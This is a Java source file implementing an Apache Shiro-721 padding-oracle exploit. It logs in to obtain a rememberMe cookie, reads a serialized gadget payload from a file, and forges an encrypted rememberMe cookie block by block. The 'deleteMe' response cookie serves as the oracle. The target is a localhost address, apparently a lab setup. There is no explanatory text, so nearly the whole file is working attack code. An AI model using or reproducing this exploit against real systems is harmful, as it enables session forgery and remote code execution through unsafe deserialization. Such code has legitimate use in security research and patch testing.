package cmisl.exp;

import org.apache.http.Header;
import org.apache.http.NameValuePair;
import org.apache.http.client.config.CookieSpecs;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.message.BasicNameValuePair;

import org.apache.shiro.codec.Base64;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Shiro721 {


    private static final CloseableHttpClient clientWithConPool;
    private static final String URL = "http://127.0.0.1:8080";
    private static byte[] validData;
    private static byte[] payload;
    private static int N;
    private static final int BLOCK_SIZE = 16; // 每个块的大小

    static {
        RequestConfig config = RequestConfig.custom()
                .setRedirectsEnabled(false) // 禁用自动重定向
                .setCookieSpec(CookieSpecs.IGNORE_COOKIES)  //静止存储cookie,防止干扰我们自己设置的cookie
                .build();

        clientWithConPool = HttpClients.custom()
                .setDefaultRequestConfig(config)
                .build();
    }

    public static void main(String[] args) throws IOException {




        validData = getValidData("http://127.0.0.1:8080/toLogin","admin","admin123");


        payload = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("./SpringBoot/src/main/java/cmisl/exp/URLDNS.ser"));
        // PKCS#7 填充
        payload = pkcs7Padding(payload);

        N = payload.length / 16;

        byte[] cipherText = new byte[0]; // 空字节流

        //获取C_N

        byte[] C_N = getCn(N,new byte[0]);
        cipherText = concatenateArrays(C_N, cipherText);

        //获取第一轮po
        byte[] paddingOracle = new byte[16];
        paddingOracle = concatenateArrays(paddingOracle, C_N);


        for (int i = N - 1; i >= 0; i--) {
            byte[] Ci = getCn(i, paddingOracle);
            cipherText = concatenateArrays(Ci, cipherText);
            paddingOracle = concatenateArrays(new byte[16], Ci);
        }

        System.out.println("------------------------------------------------");
        System.out.println(Base64.encodeToString(cipherText));
    }

    private static byte[] pkcs7Padding(byte[] data) {
        int blockSize = 16;
        int dataLength = data.length;

        // 计算填充所需的字节数
        int paddingLength = blockSize - (dataLength % blockSize);
        byte[] padding = new byte[paddingLength];
        Arrays.fill(padding, (byte) paddingLength);
        return concatenateArrays(data, padding);

    }

    private static boolean isDecryptable(byte[] po) throws IOException {
        // 编码 rememberMe 的值
        String rememberMeValue = Base64.encodeToString(concatenateArrays(validData, po));
        String cookie = "rememberMe=" + rememberMeValue; // 创建动态的 cookie 字符串

        // 创建 GET 请求
        HttpGet request = new HttpGet(URL);
        request.setHeader("Host", "localhost:8080");
        request.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0");
        request.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        request.setHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
        request.setHeader("Accept-Encoding", "gzip, deflate, br");
        request.setHeader("DNT", "1");
        request.setHeader("Sec-GPC", "1");
        request.setHeader("Connection", "keep-alive");
        request.setHeader("Cookie", cookie);
        request.setHeader("Upgrade-Insecure-Requests", "1");
        request.setHeader("Priority", "u=0, i");

        // 发送请求并获取响应
        try (CloseableHttpResponse response = clientWithConPool.execute(request)) {

            // 获取所有 Set-Cookie 头
            Header[] cookies = response.getHeaders("Set-Cookie");

            boolean hasDeleteMe = false;

            // 遍历所有 Set-Cookie 头
            for (Header cookieHeader : cookies) {
                String cookieValue = cookieHeader.getValue();


                // 检查是否包含 "deleteMe"
                if (cookieValue.contains("deleteMe")) {
                    hasDeleteMe = true;
                    break; // 找到后可以提前退出循环
                }

            }

            // 返回结果，若有任何 Cookie 包含 "deleteMe"，则返回 false
            return !hasDeleteMe;


        }
    }



    private static byte[] getCn(int n, byte[] po) throws IOException {
        // 获取 C_N 时
        if (n == N) {
            byte[] byteArray = new byte[16];
            Arrays.fill(byteArray, (byte) 0x78);
            return byteArray;
        }
        //获取IMn+1
        byte[] IM = new byte[16];

        for (int i = 15; i >= 0; i--) {
            for (int j = 0; j <= 0xFF; j++) { // 递增当前字节
                if (isDecryptable(po)) {

                    IM[i] = (byte) (j ^ (0x10 - i));
                    break;
                }

                if (po[i] < 0xFF) {
                    po[i]++;
                }
            }

            //更新po前一组的数据
            if (i > 0) {
                for (int k = i; k < BLOCK_SIZE; k++) {
                    po[k] = (byte) ((BLOCK_SIZE - i + 1) ^ IM[k]);
                }
            }
        }

        byte[] Cn = new byte[16];
        byte[] payloadBlock = getBlock(n+1,payload);
        for (int l = 0; l < 16; l++) {
            Cn[l] = (byte) (payloadBlock[l] ^ IM[l]);
        }

        return Cn;
    }

    private static byte[] concatenateArrays(byte[] array1, byte[] array2) {
        if (array1 == null && array2 == null) {
            return new byte[0]; // 返回一个空数组
        }
        if (array1 == null) {
            return array2; // 如果 array1 为 null，直接返回 array2
        }
        if (array2 == null) {
            return array1; // 如果 array2 为 null，直接返回 array1
        }

        byte[] result = new byte[array1.length + array2.length];
        System.arraycopy(array1, 0, result, 0, array1.length);
        System.arraycopy(array2, 0, result, array1.length, array2.length);
        return result;
    }

    public static byte[] getValidData(String url, String username, String password) {
        // 创建 HttpClient 实例
        try  {
            // 创建 POST 请求
            HttpPost httpPost = new HttpPost(url);

            // 添加请求头
            httpPost.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0");
            httpPost.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            httpPost.setHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
            httpPost.setHeader("Accept-Encoding", "gzip, deflate, br");
            httpPost.setHeader("Content-Type", "application/x-www-form-urlencoded");
            httpPost.setHeader("Origin", "http://127.0.0.1:8080");
            httpPost.setHeader("DNT", "1");
            httpPost.setHeader("Sec-GPC", "1");
            httpPost.setHeader("Connection", "keep-alive");
            httpPost.setHeader("Referer", "http://127.0.0.1:8080/login.html");
            httpPost.setHeader("Upgrade-Insecure-Requests", "1");
            httpPost.setHeader("Sec-Fetch-Dest", "document");
            httpPost.setHeader("Sec-Fetch-Mode", "navigate");
            httpPost.setHeader("Sec-Fetch-Site", "same-origin");
            httpPost.setHeader("Sec-Fetch-User", "?1");
            httpPost.setHeader("Priority", "u=0, i");

            // 设置请求参数
            List<NameValuePair> params = new ArrayList<>();
            params.add(new BasicNameValuePair("username", username));
            params.add(new BasicNameValuePair("password", password));
            params.add(new BasicNameValuePair("rememberMe", "true"));

            // 将参数设置到请求中
            httpPost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

            // 执行请求
            try (CloseableHttpResponse response = clientWithConPool.execute(httpPost)) {
                // 获取 Set-Cookie 头
                String setCookie = null;
                if (response.getHeaders("Set-Cookie").length > 0) {
                    setCookie = response.getHeaders("Set-Cookie")[2].getValue();
                }

                // 从 Set-Cookie 字段中提取 rememberMe 的值
                return extractRememberMeValue(setCookie);
            }
        } catch (IOException e) {

        }

        return null; // 如果发生异常或未找到 rememberMe 字段
    }


    private static byte[] extractRememberMeValue(String setCookie) {
        if (setCookie != null) {
            String[] cookies = setCookie.split("; ");
            for (String cookie : cookies) {
                if (cookie.startsWith("rememberMe=")) {
                    String base64 = cookie.substring(11); // 返回 rememberMe 字段的值
                    ensurePadding(base64);
                    return Base64.decode(base64);
                }
            }
        }
        return null; // 如果未找到 rememberMe 字段
    }



    //模仿shiro的处理方式
    private static String ensurePadding(String base64) {
        int length = base64.length();
        if (length % 4 != 0) {
            StringBuilder sb = new StringBuilder(base64);
            for (int i = 0; i < length % 4; ++i) {
                sb.append('=');
            }
            base64 = sb.toString();
        }
        return base64;
    }

    public static byte[] getBlock(int groupNumber, byte[] byteStream) {
        // 计算起始索引
        int startIndex = (groupNumber - 1) * BLOCK_SIZE;

        // 检查起始索引是否在字节流范围内
        if (startIndex < 0 || startIndex >= byteStream.length) {
            return null; // 组号超出范围
        }

        // 计算块的长度
        int length = Math.min(BLOCK_SIZE, byteStream.length - startIndex);

        // 创建结果块
        byte[] block = new byte[length];
        System.arraycopy(byteStream, startIndex, block, 0, length);

        return block;
    }

}
